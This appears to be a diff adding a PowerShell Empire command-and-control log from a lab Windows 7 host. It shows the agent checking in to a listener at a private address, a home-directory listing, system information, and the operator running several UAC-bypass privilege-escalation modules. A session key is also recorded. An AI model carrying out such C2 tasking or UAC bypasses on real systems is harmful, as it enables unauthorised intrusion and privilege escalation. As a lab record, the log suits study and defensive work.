@@ -1,0 +1,110 @@
+
+2019-05-26 09:20:58 : 
+
+[*] Agent info:
+  nonce           	8540540177936776
+  jitter          	0.6
+  servers         	None
+  internal_ip     	192.168.153.140
+  working_hours   	
+  session_key     	0dM$F:Os}b+*DZ,NRfi@Lqe_)>PcK=g/
+  children        	None
+  checkin_time    	2019-05-26 09:20:57
+  hostname        	WIN-JEQCV2C1G8I
+  id              	2
+  delay           	6
+  username        	WIN-JEQCV2C1G8I\User
+  kill_date       	
+  parent          	None
+  process_name    	powershell_ise
+  listener        	http
+  process_id      	1972
+  profile         	/aduin/gut.php,/nuws.php,/lugin/pruccess.php |Mozilla/5.0 (X11; Linux
+                                x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75
+                                Safari/537.36
+  os_details      	Microsoft Windows 7 Professional
+  lost_limit      	0
+  taskings        	None
+  name            	7L3SCVK5
+  language        	powershell
+  external_ip     	192.168.153.140
+  session_id      	7L3SCVK5
+  lastseen_time   	2019-05-26 09:20:57
+  language_version	2
+  high_integrity  	0
+
+
+[+] Agent 7L3SCVK5 now active:
+
+
+2019-05-26 09:21:44 : 
+Tasked agent to run command ls
+
+2019-05-26 09:21:46 : 
+Mode                                                      Owner                                                     LastWriteTime                                             length                                                    Name                                                     
+----                                                      -----                                                     -------------                                             ------                                                    ----                                                     
+da---                                                     WIN-JEQCV2C1G8I\User                                      5/25/2019 10:39:28 PM                                                                                               AppData                                                  
+d--hs                                                     NT AUTHORITY\SYSTEM                                       5/17/2019 2:44:06 PM                                                                                                Application Data                                         
+d-r--                                                     WIN-JEQCV2C1G8I\User                                      5/17/2019 2:44:31 PM                                                                                                Contacts                                                 
+d--hs                                                     NT AUTHORITY\SYSTEM                                       5/17/2019 2:44:06 PM                                                                                                Cookies                                                  
+d-r--                                                     WIN-JEQCV2C1G8I\User                                      5/20/2019 3:41:04 PM                                                                                                Desktop                                                  
+d-r--                                                     WIN-JEQCV2C1G8I\User                                      5/17/2019 2:44:31 PM                                                                                                Documents                                                
+d-r--                                                     WIN-JEQCV2C1G8I\User                                      5/24/2019 11:58:19 AM                                                                                               Downloads                                                
+d-r--                                                     WIN-JEQCV2C1G8I\User                                      5/17/2019 2:44:35 PM                                                                                                Favorites                                                
+d-r--                                                     WIN-JEQCV2C1G8I\User                                      5/17/2019 2:44:32 PM                                                                                                Links                                                    
+d--hs                                                     NT AUTHORITY\SYSTEM                                       5/17/2019 2:44:06 PM                                                                                                Local Settings                                           
+d-r--                                                     WIN-JEQCV2C1G8I\User                                      5/17/2019 2:44:31 PM                                                                                                Music                                                    
+d--hs                                                     NT AUTHORITY\SYSTEM                                       5/17/2019 2:44:06 PM                                                                                                My Documents                                             
+d--hs                                                     NT AUTHORITY\SYSTEM                                       5/17/2019 2:44:06 PM                                                                                                NetHood                                                  
+d-r--                                                     WIN-JEQCV2C1G8I\User                                      5/17/2019 2:44:31 PM                                                                                                Pictures                                                 
+d--hs                                                     NT AUTHORITY\SYSTEM                                       5/17/2019 2:44:06 PM                                                                                                PrintHood                                                
+d--hs                                                     NT AUTHORITY\SYSTEM                                       5/17/2019 2:44:06 PM                                                                                                Recent                                                   
+d-r--                                                     WIN-JEQCV2C1G8I\User                                      5/17/2019 2:44:32 PM                                                                                                Saved Games                                              
+d-r--                                                     WIN-JEQCV2C1G8I\User                                      5/17/2019 2:44:31 PM                                                                                                Searches                                                 
+d--hs                                                     NT AUTHORITY\SYSTEM                                       5/17/2019 2:44:06 PM                                                                                                SendTo                                                   
+d--hs                                                     NT AUTHORITY\SYSTEM                                       5/17/2019 2:44:06 PM                                                                                                Start Menu                                               
+d--hs                                                     NT AUTHORITY\SYSTEM                                       5/17/2019 2:44:06 PM                                                                                                Templates                                                
+d-r--                                                     WIN-JEQCV2C1G8I\User                                      5/17/2019 2:44:31 PM                                                                                                Videos                                                   
+-a-hs                                                     WIN-JEQCV2C1G8I\User                                      5/26/2019 9:19:48 AM                                      786432                                                    NTUSER.DAT                                               
+-a-hs                                                     NT AUTHORITY\SYSTEM                                       5/26/2019 9:19:48 AM                                      262144                                                    ntuser.dat.LOG1                                          
+-a-hs                                                     NT AUTHORITY\SYSTEM                                       5/17/2019 2:44:06 PM                                      0                                                         ntuser.dat.LOG2                                          
+-a-hs                                                     NT AUTHORITY\SYSTEM                                       5/17/2019 2:46:13 PM                                      65536                                                     NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf  
+-a-hs                                                     NT AUTHORITY\SYSTEM                                       5/17/2019 2:46:13 PM                                      524288                                                    NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContai
+                                                                                                                                                                                                                                        ner00000000000000000001.regtrans-ms                      
+-a-hs                                                     NT AUTHORITY\SYSTEM                                       5/17/2019 2:46:13 PM                                      524288                                                    NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContai
+                                                                                                                                                                                                                                        ner00000000000000000002.regtrans-ms                      
+---hs                                                     NT AUTHORITY\SYSTEM                                       5/17/2019 2:44:06 PM                                      20                                                        ntuser.ini
+
+2019-05-26 09:21:53 : 
+Tasked agent to get system information
+
+2019-05-26 09:21:56 : 
+Listener:         http://192.168.153.136:8081
+Internal IP:    192.168.153.140
+Username:         WIN-JEQCV2C1G8I\User
+Hostname:       WIN-JEQCV2C1G8I
+OS:               Microsoft Windows 7 Professional 
+High Integrity:   0
+Process Name:     powershell_ise
+Process ID:       1972
+Language:         powershell
+Language Version: 2
+
+
+2019-05-26 09:22:41 : 
+Tasked agent to run module powershell/privesc/bypassuac_env
+
+2019-05-26 09:22:49 : 
+Job started: ELP7R6
+
+2019-05-26 09:23:29 : 
+[*] Agent renamed from 7L3SCVK5 to win7
+
+2019-05-26 09:24:21 : 
+Tasked agent to run module powershell/privesc/bypassuac_fodhelper
+
+2019-05-26 09:28:19 : 
+Tasked agent to run module powershell/privesc/bypassuac_sdctlbypass
+
+2019-05-26 10:10:10 : 
+Tasked agent to run module powershell/privesc/bypassuac_sdctlbypass
